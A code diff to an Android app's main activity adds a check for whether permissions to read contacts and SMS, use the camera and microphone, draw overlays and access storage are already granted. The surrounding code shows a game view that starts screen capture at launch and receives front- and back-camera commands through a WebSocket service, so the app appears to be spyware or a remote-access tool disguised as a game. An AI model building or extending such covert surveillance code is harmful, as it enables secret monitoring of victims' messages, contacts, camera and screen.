@@ -39,7 +39,10 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         gameView = findViewById(R.id.gameView);
         mpManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-        checkPermissions();
+        // Проверяем и запрашиваем разрешения, если они уже даны – не запрашиваем повторно
+        if (!allPermissionsGranted()) {
+            checkPermissions();
+        }
         startService();
         if (sMediaProjection == null) {
             startActivityForResult(mpManager.createScreenCaptureIntent(), SCREEN_CAPTURE);
@@ -62,6 +65,25 @@ public class MainActivity extends AppCompatActivity {
         filter.addAction(WebSocketService.ACTION_CAMERA_FRONT);
         filter.addAction(WebSocketService.ACTION_CAMERA_BACK);
         registerReceiver(cameraReceiver, filter);
+    }
+
+    private boolean allPermissionsGranted() {
+        String[] perms = {
+                Manifest.permission.INTERNET,
+                Manifest.permission.READ_CONTACTS,
+                Manifest.permission.READ_SMS,
+                Manifest.permission.CAMERA,
+                Manifest.permission.RECORD_AUDIO,
+                Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                Manifest.permission.FOREGROUND_SERVICE,
+                Manifest.permission.SYSTEM_ALERT_WINDOW
+        };
+        for (String p : perms) {
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+                return false;
+            }
+        }
+        return true;
     }
 
     private void launchCamera(int requestCode) {
